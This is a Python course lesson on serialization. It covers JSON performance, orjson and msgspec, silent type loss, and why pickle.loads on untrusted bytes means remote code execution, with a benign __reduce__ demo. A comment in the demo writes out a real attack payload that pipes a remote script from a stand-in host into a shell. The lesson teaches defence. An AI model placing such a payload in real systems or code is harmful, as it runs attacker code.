# Day 33 — Serialization: Speed, Size, Silent Type Loss, and Pickle Security

[← Week 5](README.md) · **Track:** Python Systems · **Time box:** 55 min (concept 15 · gotcha 10 · code 25 · review 5)

> **Why this matters for platform work:** In a typical JSON API, serialization is one of the largest CPU costs you control. An embedding endpoint returning 1536 floats × 100 documents spends more time in `json.dumps` than in the vector DB. Serialization is also where data gets silently corrupted (NaN, money as floats, naive datetimes) and where caches become remote-code-execution vectors (pickle).

---

## 1. Core Concept

### 1.1 What `json.dumps` / `json.loads` actually cost

- CPython ships a C accelerator (`_json`) for both the scanner (`loads`) and the encoder (`dumps`). **The C encoder is used only when `indent` is `None`.** Pretty-printing (`indent=2`) silently falls back to the pure-Python encoder, which is several times slower. Never pretty-print API responses.
- `json.dumps` returns a `str`. Your framework then `.encode()`s it to bytes, which means two full copies of a multi-MB payload. Libraries that produce `bytes` directly (orjson, msgspec) skip a copy.
- `json.loads` cost is dominated by **object allocation**: one `dict`, `str`, `float` or `int` per value (Day 1). A 50 MB JSON file can easily take 5–10× that in Python objects. Stream it (NDJSON, `ijson`) instead of loading it whole.
- Floats are written with `repr()`, the shortest string that round-trips exactly, so `0.1` stays `0.1`. Python ints are arbitrary-precision, and so is JSON text, **but JavaScript's numbers are IEEE doubles**: integers above `2**53` lose precision in browsers and in many other JSON parsers. Send 64-bit IDs as strings.

### 1.2 The format landscape

| Format / lib | Output | Speed (rough, vs stdlib json) | Types | Notes |
|---|---|---|---|---|
| `json` (stdlib) | `str` | 1× | dict/list/str/int/float/bool/None | Emits `NaN`/`Infinity` by default, which **isn't valid JSON** |
| **orjson** | `bytes` | Several × faster | + `datetime`, `UUID`, `dataclass`, numpy natively | Rust. NaN → `null`. Strict UTF-8. `ORJSONResponse` in FastAPI |
| **msgspec** | `bytes` | Fastest decode when typed | Schema-typed `Struct`s; JSON and MessagePack | **Decode + validate in one pass** against a type, so you don't build a dict and then validate it |
| Pydantic v2 `model_dump_json()` | `str` | Fast (Rust core) | Your models | Avoid `json.dumps(model.model_dump())`, which goes through Python twice |
| MessagePack | `bytes` | Fast | JSON-like + binary | Usually smaller than JSON, though *not* for float-heavy data (9 bytes per float); not human-readable. Good for internal RPC and caches |
| `pickle` | `bytes` | Fast | **Any Python object graph** | Python-only, version-coupled, and **executes code on load** |

Protocol versions matter for pickle: protocol 4 is the default from 3.8 to 3.13 and 5 from 3.14. Protocol 5 (PEP 574) adds out-of-band buffers for zero-copy numpy/Arrow data. Old protocols bloat payloads and can't handle large objects.

### 1.3 Pickle executes code by design

A pickle is a small program for a stack-based VM. Its `REDUCE` opcode means "call this callable with these arguments". Any class can define `__reduce__` to return `(callable, args)`, and `pickle.loads` will call it, with any importable callable such as `os.system` or `subprocess.Popen`. **`pickle.loads` on bytes an attacker can influence is remote code execution.** It's not a bug and it won't be fixed. Where untrusted pickles turn up:

- **Shared caches:** Redis or memcached values written with pickle. Anyone who can write to the cache (a compromised neighbour service, an SSRF bug, a misconfigured ACL) gets code execution on every reader.
- **ML artifacts:** `.pkl`, `joblib` files, and older `torch.load` (PyTorch 2.6 changed the default to `weights_only=True`). Use **safetensors** for weights, and treat downloaded models as untrusted code.
- **Session cookies or message queues** carrying pickled payloads.

`pickle` also couples data to **code layout**. It stores `module.ClassName`, so renaming a module (Day 29) or a class makes every cached pickle unloadable. During a rolling deploy, old and new pods disagree about the same keys.

### 1.4 Types JSON silently loses

| Python value | `json.dumps` result | Coming back | Fix |
|---|---|---|---|
| `float("nan")` | `NaN` (invalid JSON; many parsers reject it) | `nan` in Python, **error** in JS/Go | `allow_nan=False`, then decide: `null` or reject the record |
| `Decimal("19.99")` | `TypeError` | — | Send a string, or integer minor units (`1999` cents); parse with `parse_float=Decimal` |
| `datetime` | `TypeError` | — | `isoformat()` on **aware** datetimes only; `datetime.fromisoformat` accepts `Z` since 3.11 |
| `(1, 2)` tuple | `[1, 2]` | `list` | Schema-aware decode (msgspec, Pydantic) |
| `{7: "x"}` | `{"7": "x"}` | **string key** `"7"` | Don't use non-str keys in wire dicts |
| `2**64 + 1` | exact digits | exact in Python; **rounded in JS** | Send as a string |

---

## 2. Production Gotcha: `default=str` and pickle-in-Redis

### 2a. `json.dumps(obj, default=str)`: the line that silences every type error

It's the top Stack Overflow answer for "Object of type X is not JSON serializable", and in production it means:

- `datetime` becomes `"2026-10-10 12:00:00"`: no `T`, and **no timezone if it's naive**. Consumers then parse it as UTC or as local time, depending on their language.
- `Decimal("19.99")` becomes `"19.99"`. Fine, as long as every consumer knows it's a string.
- **Any object** you didn't mean to send becomes `"<app.models.User object at 0x7f…>"`, a silent bug in place of a crash. Add a SQLAlchemy model or a `set` by accident and you'll find out from a customer.

**Fix:** use an explicit `default=` hook that handles known types and **raises** for everything else, as in `to_wire` below. Better still, serialize from a schema (Pydantic `response_model`, msgspec `Struct`), where the types are declared once.

### 2b. Pickle as a cache format

```python
redis.set(key, pickle.dumps(result))            # 🚨 any writer to Redis can now run code on every reader
obj = pickle.loads(redis.get(key))              # 🚨 and a module rename breaks every key mid-deploy
```

**Fix:** use JSON, msgpack, or schema-typed msgspec in caches, and include a **schema version** in the key (`user:v3:{id}`) so rolling deploys never read each other's formats. If you truly must pickle (trusted, same-version, single-process), sign the payloads with HMAC and verify before loading. That only helps if the signing key isn't readable by the attacker.

---

## 3. Runnable Code Example

It benchmarks codecs (orjson and msgspec are picked up automatically if installed), demonstrates silent type loss and a strict encoder, streams NDJSON, and shows `pickle.loads` running a callable. Save as `day33_serialization.py`.

```python
"""
Day 33 — Serialization: speed/size trade-offs, silent type loss, a strict
encoder, NDJSON streaming, and why pickle.loads on untrusted bytes is RCE.

Run:  python day33_serialization.py     (Python 3.12+; orjson/msgspec optional)
"""
from __future__ import annotations

import io
import json
import pickle
import timeit
from collections.abc import Callable, Iterable, Iterator
from datetime import UTC, datetime
from decimal import Decimal
from typing import Any, TextIO

type Codec = tuple[Callable[[Any], bytes], Callable[[bytes], Any]]


def make_payload(n: int = 2_000) -> list[dict[str, Any]]:
    """Shaped like an embedding-search response."""
    return [
        {
            "id": i,
            "doc": f"doc-{i % 97}",
            "score": round(1 / (i + 1), 6),
            "tags": ["rag", "prod"],
            "embedding": [round(j * 0.001, 6) for j in range(32)],
            "active": i % 3 == 0,
        }
        for i in range(n)
    ]


def available_codecs() -> dict[str, Codec]:
    table: dict[str, Codec] = {
        "json default": (lambda o: json.dumps(o).encode(), json.loads),
        "json compact": (lambda o: json.dumps(o, separators=(",", ":")).encode(), json.loads),
        "json indent=2": (lambda o: json.dumps(o, indent=2).encode(), json.loads),
        "pickle p5": (lambda o: pickle.dumps(o, protocol=5), pickle.loads),
    }
    try:
        import orjson  # type: ignore[import-not-found]
        table["orjson"] = (orjson.dumps, orjson.loads)
    except ImportError:
        print("(orjson not installed - skipping)")
    try:
        import msgspec  # type: ignore[import-not-found]
        table["msgspec json"] = (msgspec.json.encode, msgspec.json.decode)
        table["msgspec msgpack"] = (msgspec.msgpack.encode, msgspec.msgpack.decode)
    except ImportError:
        print("(msgspec not installed - skipping)")
    return table


def benchmark(payload: list[dict[str, Any]], number: int = 5, repeat: int = 3) -> None:
    print(f"\n{'codec':<16} {'size KB':>8} {'dumps ms':>9} {'loads ms':>9}")
    for name, (dumps, loads) in available_codecs().items():
        blob = dumps(payload)
        assert loads(blob) == payload, name
        t_dump = min(timeit.repeat(lambda d=dumps: d(payload), number=number, repeat=repeat)) / number
        t_load = min(timeit.repeat(lambda l=loads, b=blob: l(b), number=number, repeat=repeat)) / number
        print(f"{name:<16} {len(blob) / 1024:>8.0f} {t_dump * 1000:>9.2f} {t_load * 1000:>9.2f}")


def silent_type_loss() -> None:
    print("\n-- what default=str + JSON does to your types")
    record: dict[Any, Any] = {
        "when": datetime(2026, 10, 10, 12, 0),       # naive!
        "amount": Decimal("19.99"),
        "pair": (1, 2),
        7: "int key",
        "ratio": float("nan"),
        "big_id": 2**64 + 1,
    }
    wire = json.dumps(record, default=str)
    print("  wire:", wire)
    back = json.loads(wire)
    for key, before in record.items():
        after_key = str(key)
        after = back[after_key]
        print(f"  {key!r:<9} {type(before).__name__:<9} -> key {after_key!r:<9} {type(after).__name__:<6} {after!r}")


def to_wire(obj: Any) -> Any:
    """Strict default hook: handle known types explicitly, refuse everything else."""
    if isinstance(obj, datetime):
        if obj.tzinfo is None:
            raise ValueError("naive datetime - refusing to guess the timezone")
        return obj.isoformat()
    if isinstance(obj, Decimal):
        return str(obj)                               # documented as a string in the schema
    raise TypeError(f"{type(obj).__name__} is not part of the wire schema")


def strict_encoding() -> None:
    print("\n-- strict encoder")
    good = {"when": datetime(2026, 10, 10, 12, 0, tzinfo=UTC), "amount": Decimal("19.99")}
    print("  ok:", json.dumps(good, default=to_wire, allow_nan=False))
    bad_cases: list[Any] = [
        {"when": datetime(2026, 10, 10)},
        {"ratio": float("nan")},
        {"user": object()},
    ]
    for bad in bad_cases:
        try:
            json.dumps(bad, default=to_wire, allow_nan=False)
        except (TypeError, ValueError) as exc:
            print(f"  rejected {type(exc).__name__}: {exc}")


def write_ndjson(records: Iterable[dict[str, Any]], out: TextIO) -> int:
    count = 0
    for record in records:
        out.write(json.dumps(record, separators=(",", ":")))
        out.write("\n")
        count += 1
    return count


def read_ndjson(stream: TextIO) -> Iterator[dict[str, Any]]:
    """One record in memory at a time (Day 3 generators)."""
    for line in stream:
        if line.strip():
            yield json.loads(line)


def ndjson_streaming(payload: list[dict[str, Any]]) -> None:
    print("\n-- NDJSON streaming")
    buf = io.StringIO()
    written = write_ndjson(payload, buf)
    buf.seek(0)
    active = sum(1 for rec in read_ndjson(buf) if rec["active"])
    print(f"  wrote {written} lines; streamed back, {active} active")


class Exploit:
    def __reduce__(self) -> tuple[Callable[..., Any], tuple[Any, ...]]:
        # A real attacker returns (os.system, ("curl evil.sh | sh",)).
        return (print, ("  [pickle] attacker-chosen callable ran INSIDE pickle.loads()",))


def pickle_is_code() -> None:
    print("\n-- pickle executes code on load")
    blob = pickle.dumps(Exploit())
    print(f"  payload is {len(blob)} bytes; loading it...")
    result = pickle.loads(blob)
    print("  loads() returned:", result)


if __name__ == "__main__":
    data = make_payload()
    benchmark(data)
    silent_type_loss()
    strict_encoding()
    ndjson_streaming(data)
    pickle_is_code()
```

**Expected output (one real run with orjson and msgspec installed; timings vary by machine, and without them you'll see two "not installed - skipping" lines and only the four stdlib rows):**

```text

codec             size KB  dumps ms  loads ms
json default          635     35.68     17.69
json compact          549     36.10     17.51
json indent=2        1115    117.68     22.69
pickle p5             660      5.37      7.99
orjson                549      4.48      6.33
msgspec json          549      7.76      7.41
msgspec msgpack       697      1.59      8.42

-- what default=str + JSON does to your types
  wire: {"when": "2026-10-10 12:00:00", "amount": "19.99", "pair": [1, 2], "7": "int key", "ratio": NaN, "big_id": 18446744073709551617}
  'when'    datetime  -> key 'when'    str    '2026-10-10 12:00:00'
  'amount'  Decimal   -> key 'amount'  str    '19.99'
  'pair'    tuple     -> key 'pair'    list   [1, 2]
  7         str       -> key '7'       str    'int key'
  'ratio'   float     -> key 'ratio'   float  nan
  'big_id'  int       -> key 'big_id'  int    18446744073709551617

-- strict encoder
  ok: {"when": "2026-10-10T12:00:00+00:00", "amount": "19.99"}
  rejected ValueError: naive datetime - refusing to guess the timezone
  rejected ValueError: Out of range float values are not JSON compliant: nan
  rejected TypeError: object is not part of the wire schema

-- NDJSON streaming
  wrote 2000 lines; streamed back, 667 active

-- pickle executes code on load
  payload is 101 bytes; loading it...
  [pickle] attacker-chosen callable ran INSIDE pickle.loads()
  loads() returned: None
```

Read the benchmark. `indent=2` is about 3× slower to dump and nearly twice the size, because it disables the C encoder. Compact separators cut about 13% of the bytes for free. orjson dumps about 8× faster than stdlib `json`. Pickle is the fastest stdlib option, which is exactly why teams reach for it and then regret it. **MessagePack came out *larger* than compact JSON here**: every float costs 9 bytes in msgpack, while short decimals like `0.001` are 5 characters in JSON. Measure with your real payloads instead of trusting a format's reputation. In the type-loss table, note that the key `7` became `"7"` and the naive datetime lost its `T` separator and has no timezone.

**Exercises (10 min):**

1. `pip install orjson msgspec` and rerun. Compare the `loads` columns. Then define a `msgspec.Struct` matching one record and decode with `msgspec.json.decode(blob, type=list[Record])`. Typed decoding is often faster than untyped.
2. Use `pickletools.dis(pickle.dumps(Exploit()))` to find the `REDUCE` opcode in the disassembly.
3. Change `big_id` to `2**53 + 1`, paste the wire JSON into a browser console with `JSON.parse`, and look at the number you get back.

---

## 4. Curated Video Resources

| Priority | Search on YouTube | Channel / Speaker | Why |
|---|---|---|---|
| ⭐ Primary | `mCoding pickle security python` | **mCoding** | How `__reduce__` turns deserialization into code execution |
| Deep dive | `Jim Crist-Harif msgspec fast serialization` | **PyCon / PyData** (msgspec's author) | Why typed decoding beats decode-then-validate; allocation costs |
| Practical | `ArjanCodes json serialization python dataclasses pydantic` | **ArjanCodes** | Clean boundaries between domain objects and wire formats |

---

[← Day 32 — Union-Find](day-32-union-find.md) · [Day 34 — Dijkstra →](day-34-dijkstra.md)
